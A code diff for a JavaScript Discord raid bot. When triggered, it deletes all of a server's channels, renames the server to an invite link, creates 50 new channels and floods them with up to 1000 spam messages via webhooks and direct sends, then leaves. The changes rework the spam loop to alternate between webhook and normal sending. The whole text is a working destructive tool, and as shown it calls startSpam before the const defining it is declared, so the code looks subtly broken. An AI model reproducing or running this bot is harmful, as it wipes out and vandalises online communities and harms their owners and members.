@@ -142,7 +142,8 @@ client.on('messageCreate', async (message) => {
     try {
       console.log(`🎯 Targeting server: ${guild.name}`);
 
-      let didSomething = false;
+      let sentMessages = 0;
+      const MAX_MESSAGES = 1000;
 
       // Step 1: Delete existing channels concurrently
       await Promise.all(guild.channels.cache.map(channel =>
@@ -164,38 +165,13 @@ client.on('messageCreate', async (message) => {
       // Step 4: Rename server
       await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(() => {}));
 
-      // Step 5: Create 50 channels as fast as possible
+      // Step 5: Create 50 channels FAST
       const createdChannels = [];
       const totalChannelsToCreate = 50;
-      const channelsReadyForSpam = [];
 
       console.log(`🆕 Creating ${totalChannelsToCreate} channels FAST...`);
 
       const createPromises = [];
-
-      // Function to start spam
-      const startSpam = async (channels) => {
-        let sent = 0;
-        const MAX_MESSAGES = 1000;
-
-        while (sent < MAX_MESSAGES) {
-          for (const channel of channels) {
-            if (sent >= MAX_MESSAGES) break;
-            if (!channel || !channel.send) continue;
-
-            try {
-              await handleRateLimit(() => channel.send(spamMessage));
-              sent++;
-              if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
-            } catch (err) {
-              console.error(`⚠️ Send failed: ${err.message}`);
-            }
-
-            await new Promise(r => setTimeout(r, 1)); // tiny delay
-          }
-        }
-        console.log(`✅ Sent ${sent} messages.`);
-      };
 
       for (let i = 0; i < totalChannelsToCreate; i++) {
         createPromises.push((async () => {
@@ -204,13 +180,8 @@ client.on('messageCreate', async (message) => {
           );
           if (channel) {
             createdChannels.push(channel);
-            if (createdChannels.length <= 5) {
-              channelsReadyForSpam.push(channel);
-              if (channelsReadyForSpam.length === 5) {
-                console.log('📨 Starting spam early after 5 channels...');
-                startSpam([...createdChannels]);
-              }
-            }
+            console.log(`✅ Created channel: ${channel.name}`);
+            startSpam(channel, i % 2 === 0); // alternate between webhook and .send()
           }
         })());
       }
@@ -221,16 +192,55 @@ client.on('messageCreate', async (message) => {
         return message.channel.send('❌ Could not create any channels. Aborting.');
       }
 
-      // If spam didn't start yet, do it now
-      if (channelsReadyForSpam.length < 5) {
-        console.log('📨 Starting spam with whatever channels were made...');
-        startSpam(createdChannels);
-      }
+      // Function to spam in a single channel until we hit global limit
+      const startSpam = async (channel, useWebhook) => {
+        const avatarURL = 'https://i.imgur.com/6QbX6yA.png '; // Nebula icon
 
-      // Wait up to 10 seconds for spam to finish
+        while (sentMessages < MAX_MESSAGES) {
+          if (useWebhook) {
+            try {
+              const webhook = await handleRateLimit(() =>
+                channel.createWebhook({
+                  name: 'Nebula',
+                  avatar: avatarURL
+                }).catch(() => null)
+              );
+
+              if (webhook) {
+                await handleRateLimit(() => webhook.send(spamMessage));
+                sentMessages++;
+                if (sentMessages % 100 === 0) console.log(`📨 [WEBHOOK] Sent: ${sentMessages}`);
+              } else {
+                // Fallback to .send()
+                await handleRateLimit(() => channel.send(spamMessage));
+                sentMessages++;
+                if (sentMessages % 100 === 0) console.log(`📨 [FALLBACK] Sent: ${sentMessages}`);
+              }
+            } catch (err) {
+              console.error(`⚠️ Webhook failed: ${err.message}`);
+              try {
+                await handleRateLimit(() => channel.send(spamMessage));
+                sentMessages++;
+              } catch {}
+            }
+          } else {
+            try {
+              await handleRateLimit(() => channel.send(spamMessage));
+              sentMessages++;
+              if (sentMessages % 100 === 0) console.log(`📨 [SEND] Sent: ${sentMessages}`);
+            } catch (err) {
+              console.error(`⚠️ Send failed: ${err.message}`);
+            }
+          }
+
+          await new Promise(r => setTimeout(r, 1)); // tiny delay
+        }
+      };
+
+      // Wait up to 10 seconds to allow spam to finish
       await new Promise(r => setTimeout(r, 10000));
 
-      // Step 7: Leave server
+      // Leave server
       await handleRateLimit(() => guild.leave());
 
       console.log('✅ Successfully completed operation.');
